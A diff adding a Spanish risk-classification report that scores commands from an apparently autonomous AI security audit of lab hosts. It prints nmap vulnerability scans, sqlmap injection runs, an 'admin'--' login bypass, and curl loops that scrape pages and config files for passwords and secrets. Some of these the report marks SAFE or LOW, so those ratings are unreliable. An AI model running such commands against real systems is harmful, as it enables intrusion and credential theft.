@@ -1,0 +1,43 @@
+﻿ANÁLISIS DE SEGURIDAD - CLASIFICACIÓN DE COMANDOS POR RIESGO
+Conversación;Realiza una auditoría de seguridad autónoma de la 
+ID;conv_fddb32d0ff48
+Fecha análisis;2026-02-05 18:36:55
+
+=== ESTADÍSTICAS DE RIESGO ===
+TOTAL CRITICAL;0
+TOTAL HIGH;1
+TOTAL MEDIUM;5
+TOTAL LOW;5
+TOTAL SAFE;4
+TOTAL COMANDOS;15
+
+=== ESTADÍSTICAS DE USO DE COMANDOS ===
+Comando;Veces usado
+curl;6
+nmap;3
+nikto;2
+sqlmap;2
+ffuf;1
+apt-get;1
+
+=== INTERVENCIONES DE USUARIO ===
+Total mensajes usuario;16
+Total mensajes en thread;85
+
+=== DETALLE DE COMANDOS POR RIESGO ===
+Comando;Nivel Riesgo (Número);Nivel Riesgo;Razón
+nmap -p- -sV --script vuln,http-methods,http-title -oA /workspace_persistent/nmap_full 10.5.0.5;4;HIGH;Nmap vulnerability scripts
+nikto -h 10.10.0.3 -C all -output /workspace_persistent/nikto_report.txt;3;MEDIUM;Web vulnerability scanner
+ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.0.3/FUZZ -t 50 -o /workspace_persistent/recon_dir.txt;3;MEDIUM;Fast web fuzzer
+"sqlmap -u ""http://10.10.0.3/login.php"" --data=""username=USER&password=PASS"" --forms --batch";3;MEDIUM;SQL injection testing
+"sqlmap -u ""http://10.10.0.3/login.php"" --data=""username=USER&password=PASS"" --forms --batch --level 5 --risk 3";3;MEDIUM;SQL injection testing
+nikto -h 10.10.10.10;3;MEDIUM;Web vulnerability scanner
+nmap -sV -p- --min-rate=5000 -oA /workspace_persistent/nmap_full 10.10.0.3;2;LOW;Sin patrones de riesgo detectados
+apt-get update && apt-get install -y nmap masscan;2;LOW;Sin patrones de riesgo detectados
+nmap --script-updatedb;2;LOW;Sin patrones de riesgo detectados
+curl -s http://10.10.0.3/config/;2;LOW;Sin patrones de riesgo detectados
+"curl -s ""http://10.10.0.3/login.php?username=admin'--&password=pass"" | grep 'Welcome'";2;LOW;Sin patrones de riesgo detectados
+curl -s http://10.10.0.3/config/ && curl -s http://10.10.0.3/docs/ && curl -s http://10.10.0.3/.gitignore && curl -s http://10.10.0.3/login.php | grep -i 'form';1;SAFE;Comando seguro (whitelist)
+curl -s http://10.10.0.3/config/config.inc.php | grep -i 'password' && curl -s http://10.10.0.3/Dockerfile;1;SAFE;Comando seguro (whitelist)
+"curl -s http://10.10.0.3/ | grep -i 'href' | cut -d"" '"" -f2 | while read url; do curl -s ""http://10.10.0.3/$url"" 2>/dev/null | grep -iE 'password|key|secret'; done";1;SAFE;Comando seguro (whitelist)
+"curl -s http://10.10.0.3/ | grep -o 'href=""[^""]*""' | cut -d '""' -f 2 | while read path; do curl -s ""http://10.10.0.3/$path"" | grep -iE '(password|username|key|secret)' && echo ""$path""; done";1;SAFE;Comando seguro (whitelist)
